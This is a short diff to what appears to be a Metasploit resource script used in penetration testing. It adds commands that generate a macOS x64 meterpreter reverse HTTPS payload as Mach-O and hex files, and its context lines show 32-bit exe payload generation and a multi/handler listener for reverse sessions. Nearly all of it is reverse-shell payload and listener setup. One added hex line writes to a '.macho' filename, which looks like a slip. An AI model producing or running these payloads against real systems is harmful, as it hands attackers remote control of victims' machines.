@@ -28,6 +28,11 @@ set PayloadUUIDName ParanoidStagedExe32
 generate -t exe -f /pentest/share/reverse.http.i386.exe
 generate -t hex -f /pentest/share/reverse.http.i386.hex
 
+use payload/osx/x64/meterpreter_reverse_https
+set PayloadUUIDName ParanoidStagedMacho64
+generate -t macho -f /pentest/share/reverse.http.amd64_osx.macho
+generate -t hex -f /pentest/share/reverse.http.amd64_osx.macho
+
 use exploit/multi/handler
 set PAYLOAD multi/meterpreter/reverse_https
 set ExitOnSession false
